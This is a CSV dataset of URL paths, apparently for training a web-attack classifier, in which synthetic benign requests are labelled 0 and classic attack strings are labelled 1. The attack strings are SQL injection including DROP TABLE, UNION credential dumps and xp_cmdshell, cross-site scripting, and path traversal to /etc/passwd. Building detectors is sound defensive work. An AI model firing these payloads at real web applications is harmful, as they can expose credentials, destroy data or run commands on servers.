payload,label
/admin' --,1
/login?id=1828,0
/api/users?sort=asc721,0
/dashboard?category=tech570,0
/products/item,0
/contact?user=urmit303,0
/index.html?sort=asc903,0
/dashboard?sort=asc167,0
/index.html?page=2694,0
/index.html?sort=asc108,0
/index.html?id=1623,0
/api/users,0
/products/item,0
/api/users,0
/about?user=urmit680,0
/about,0
/login?sort=asc916,0
/checkout,0
/about?sort=asc928,0
/contact?search=?id=1; DROP TABLE users,1
/login?page=2679,0
/<script>alert(document.cookie)</script>,1
/login?user=urmit761,0
/checkout?category=tech968,0
/index.html?search=?id=1; DROP TABLE users,1
/dashboard?user=urmit447,0
/contact?category=tech437,0
/checkout,0
/contact?page=2397,0
/index.html?page=2845,0
/index.html?page=2891,0
/api/users?user=urmit234,0
/index.html?category=tech711,0
/login?sort=asc83,0
/dashboard?id=1393,0
/' OR '1'='1,1
/index.html?page=2582,0
/api/users?page=2354,0
/index.html?category=tech518,0
/dashboard?category=tech618,0
/login?page=2792,0
/contact,0
/about?id=1838,0
/index.html?sort=asc108,0
/checkout?sort=asc552,0
/login?sort=asc498,0
/api/users,0
/?id=1; DROP TABLE users,1
/checkout?category=tech662,0
/dashboard?user=urmit630,0
/api/users?sort=asc899,0
/login,0
/api/users?sort=asc911,0
/checkout?category=tech979,0
/about?category=tech157,0
/login?category=tech840,0
"/"" OR 1=1 --",1
/dashboard?sort=asc444,0
/../../../../etc/passwd,1
/contact?category=tech915,0
/products/item,0
/dashboard?search=?id=1; DROP TABLE users,1
/contact?user=urmit790,0
/about,0
/login?category=tech58,0
/products/item?page=2542,0
/contact?user=urmit653,0
/dashboard,0
/../../../windows/system32/cmd.exe,1
/about?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/checkout?user=urmit322,0
/api/users?id=1373,0
/index.html?id=1195,0
/dashboard?sort=asc538,0
/login?sort=asc213,0
/login?id=1530,0
/products/item?user=urmit892,0
/onload=prompt(1),1
/api/users?user=urmit247,0
/login?id=1117,0
/about?id=1729,0
/contact?user=urmit87,0
/dashboard?sort=asc114,0
/checkout?id=1237,0
/dashboard,0
"/UNION SELECT username, password FROM users",1
/login?sort=asc780,0
/products/item?sort=asc528,0
/dashboard?search='; EXEC xp_cmdshell('dir');--,1
/api/users,0
"/dashboard?search=UNION SELECT username, password FROM users",1
/index.html,0
/login?page=2358,0
/contact?id=1851,0
/checkout?category=tech164,0
/login?user=urmit174,0
/login?sort=asc494,0
/about?sort=asc490,0
/checkout?user=urmit829,0
/products/item?user=urmit330,0
/about?category=tech565,0
/index.html?user=urmit988,0
/api/users?search=onload=prompt(1),1
/about?id=1179,0
/login?search=../../../../etc/passwd,1
/contact?category=tech836,0
/index.html?id=1451,0
/contact?sort=asc512,0
/products/item?id=1374,0
/products/item?sort=asc401,0
/login?user=urmit284,0
/api/users?sort=asc725,0
/login,0
/about?id=128,0
/contact?page=2981,0
/?id=1; DROP TABLE users,1
/checkout,0
/about?user=urmit729,0
/about?user=urmit824,0
/../../../../etc/passwd,1
/checkout?user=urmit736,0
/<script>alert(document.cookie)</script>,1
/checkout?search=onload=prompt(1),1
/contact?page=2281,0
/index.html,0
/onload=prompt(1),1
/login?id=1784,0
/login?id=1838,0
/products/item?user=urmit202,0
/dashboard?user=urmit484,0
/checkout?id=1666,0
/?id=1; DROP TABLE users,1
/login?sort=asc891,0
/checkout?id=1102,0
/api/users?sort=asc978,0
/index.html?sort=asc429,0
/products/item?sort=asc193,0
"/UNION SELECT username, password FROM users",1
/dashboard,0
/contact?sort=asc889,0
/login?user=urmit150,0
/index.html?sort=asc733,0
/index.html?category=tech443,0
/index.html?page=2356,0
/login?category=tech84,0
/products/item?id=157,0
/contact?user=urmit68,0
/login?user=urmit209,0
/'; EXEC xp_cmdshell('dir');--,1
/login?category=tech206,0
/index.html?user=urmit336,0
/contact?id=1717,0
/index.html?sort=asc606,0
/index.html?user=urmit44,0
/checkout?search=onload=prompt(1),1
/contact,0
/api/users?id=1751,0
/login?page=2951,0
/contact,0
/login?id=1456,0
/checkout?category=tech874,0
/index.html?user=urmit657,0
/index.html?user=urmit144,0
/dashboard?search=javascript:eval('var a=1'),1
/products/item?id=1906,0
/login,0
/index.html?id=1477,0
/api/users?page=2962,0
/../../../../etc/passwd,1
/checkout?category=tech535,0
/about?page=2392,0
/login?user=urmit362,0
/about?page=2410,0
/index.html?sort=asc755,0
/index.html?user=urmit751,0
/login?user=urmit192,0
/?id=1; DROP TABLE users,1
/../../../windows/system32/cmd.exe,1
/about?sort=asc584,0
/checkout?user=urmit195,0
/index.html?id=1343,0
/api/users,0
/contact?category=tech54,0
/dashboard?user=urmit332,0
/dashboard?sort=asc874,0
/api/users?sort=asc789,0
/../../../../etc/passwd,1
"/UNION SELECT username, password FROM users",1
/login?category=tech172,0
/contact?sort=asc251,0
/about?page=2285,0
/dashboard?user=urmit142,0
/api/users?category=tech981,0
/login,0
/about?sort=asc522,0
/index.html?category=tech418,0
/login?id=1709,0
/contact?id=1934,0
/products/item?sort=asc887,0
/login?sort=asc911,0
/dashboard?user=urmit752,0
/../../../windows/system32/cmd.exe,1
/dashboard?sort=asc565,0
/products/item?category=tech235,0
/products/item?user=urmit135,0
/index.html?category=tech942,0
/contact?category=tech818,0
/api/users?search=' OR '1'='1,1
/dashboard?sort=asc908,0
/dashboard?user=urmit811,0
/index.html?id=1971,0
/about,0
/login?page=2592,0
/contact?id=1996,0
/index.html?sort=asc126,0
/contact?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/login?sort=asc943,0
/index.html?user=urmit341,0
/products/item?id=1823,0
/about?search=admin' --,1
/about?id=1494,0
/api/users?page=2402,0
/products/item?sort=asc381,0
/contact?id=1216,0
/admin' --,1
/index.html?user=urmit255,0
/javascript:eval('var a=1'),1
/login?page=2523,0
/index.html?id=1158,0
/dashboard?id=1927,0
/dashboard?page=2370,0
/dashboard?user=urmit358,0
/dashboard?page=2567,0
/checkout?id=1914,0
/'; EXEC xp_cmdshell('dir');--,1
/about?category=tech504,0
/checkout?sort=asc93,0
/about?id=1247,0
/products/item?sort=asc320,0
/dashboard?category=tech692,0
/products/item?category=tech986,0
/dashboard?id=1517,0
/checkout?sort=asc222,0
/contact?id=1576,0
/api/users?page=2927,0
/api/users?search='; EXEC xp_cmdshell('dir');--,1
/products/item?search=../../../../etc/passwd,1
/index.html,0
/?id=1; DROP TABLE users,1
/login?user=urmit865,0
/contact?page=2329,0
/products/item?id=162,0
/products/item?search=../../../windows/system32/cmd.exe,1
/admin' --,1
/index.html?category=tech399,0
/api/users?page=2299,0
/login?page=2578,0
/index.html?page=2325,0
/login,0
/<script>alert(document.cookie)</script>,1
/checkout,0
/<script>alert(document.cookie)</script>,1
/contact?id=1471,0
/api/users,0
/login,0
/api/users?user=urmit110,0
/api/users?category=tech367,0
/api/users?category=tech198,0
/contact?user=urmit65,0
/login?page=2952,0
/dashboard?id=122,0
/dashboard,0
/api/users?category=tech656,0
/index.html?sort=asc432,0
/login?id=1646,0
/login?sort=asc215,0
/contact?sort=asc329,0
/login?search=../../../windows/system32/cmd.exe,1
/javascript:eval('var a=1'),1
/admin' --,1
/javascript:eval('var a=1'),1
/index.html?search='; EXEC xp_cmdshell('dir');--,1
"/contact?search=UNION SELECT username, password FROM users",1
/login?page=2337,0
/dashboard?page=2986,0
/api/users?category=tech53,0
/about?category=tech215,0
/index.html?id=1347,0
/dashboard?page=2803,0
/admin' --,1
/products/item?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/about?user=urmit280,0
/login?search=' OR '1'='1,1
/products/item?page=2838,0
/products/item?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
